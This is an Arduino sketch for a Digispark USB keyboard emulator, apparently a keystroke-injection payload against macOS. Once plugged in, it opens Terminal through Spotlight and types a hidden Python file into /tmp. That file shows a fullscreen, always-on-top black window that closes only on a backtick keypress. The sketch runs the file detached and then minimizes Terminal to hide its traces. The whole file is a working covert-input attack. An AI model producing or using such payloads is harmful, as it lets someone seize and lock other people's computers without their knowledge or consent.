#include <DigiKeyboard.h>
#include <avr/pgmspace.h>

void ptype(const char* s){char c;while((c=pgm_read_byte(s++))){DigiKeyboard.print(c);delay(8);}}
void pln(const char* s){ptype(s);DigiKeyboard.sendKeyStroke(KEY_ENTER);DigiKeyboard.delay(50);}

void setup() {
  DigiKeyboard.delay(5000);
  DigiKeyboard.sendKeyStroke(0x2C, MOD_GUI_LEFT);
  DigiKeyboard.delay(1200);
  ptype(PSTR("Terminal"));
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(4000);

  pln(PSTR("cat>/tmp/.b.py<<'E'"));
  DigiKeyboard.delay(300);
  pln(PSTR("import tkinter as t"));
  pln(PSTR("r=t.Tk()"));
  pln(PSTR("r.configure(bg='black')"));
  pln(PSTR("r.attributes('-fullscreen',True)"));
  pln(PSTR("r.attributes('-topmost',True)"));
  pln(PSTR("r.focus_force()"));
  pln(PSTR("r.bind('<Key>',lambda e:r.destroy() if e.char=='`' else None)"));
  pln(PSTR("r.mainloop()"));
  pln(PSTR("E"));
  DigiKeyboard.delay(500);
  pln(PSTR("nohup python3 /tmp/.b.py&disown;osascript -e 'tell app \"Terminal\" to set miniaturized of every window to true'"));
}
void loop(){DigiKeyboard.delay(1);}
